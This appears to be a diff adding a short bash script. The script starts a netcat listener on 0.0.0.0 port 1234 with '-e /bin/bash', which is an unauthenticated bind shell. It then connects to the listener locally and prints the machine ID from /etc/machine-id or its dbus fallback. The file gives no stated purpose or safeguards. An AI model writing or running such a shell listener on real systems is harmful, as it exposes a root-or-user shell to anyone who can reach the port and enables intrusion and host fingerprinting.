@@ -1,0 +1,19 @@
+#!/bin/bash
+echo "going to open a listener on 0.0.0.0(US) on port 1234........ "
+netcat -vvl -p 1234 -e /bin/bash & 
+sleep 4
+echo "connecting"
+nc 0.0.0.0 1234 &
+sleep 2
+echo "connected"
+cat /etc/machine-id || cat /var/lib/dbus/machine-id
+
+
+
+
+
+
+
+
+
+
